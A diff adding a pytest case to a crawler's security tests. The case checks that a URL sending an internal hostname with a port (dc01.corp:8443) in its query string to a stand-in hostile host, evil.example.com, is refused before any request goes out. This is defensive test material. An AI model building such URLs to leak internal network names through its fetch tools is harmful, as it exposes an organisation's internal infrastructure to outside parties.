@@ -488,6 +488,25 @@ async def test_url_query_internal_identifier_refused() -> None:
 
 
 @pytest.mark.asyncio
+async def test_url_query_internal_host_port_refused() -> None:
+    """An internal FQDN written as ``host:port`` in the query string is still the
+    internal FQDN — the port must not hide it from the guard."""
+    calls = {"n": 0}
+
+    def h(req: httpx.Request) -> httpx.Response:
+        calls["n"] += 1
+        return httpx.Response(200, json={})
+
+    with _patch_httpx(h), _patch_resolve():
+        r = await crawl_page(
+            "https://evil.example.com/check?h=dc01.corp:8443", settings=_settings()
+        )
+    assert r["ok"] is False
+    assert "refused" in r["error"]
+    assert calls["n"] == 0
+
+
+@pytest.mark.asyncio
 async def test_url_encoded_internal_identifier_refused() -> None:
     """The URL is decoded ONCE before scanning, so a percent-encoded internal
     FQDN in the query (``dc01%2Ecorp``) cannot slip past."""
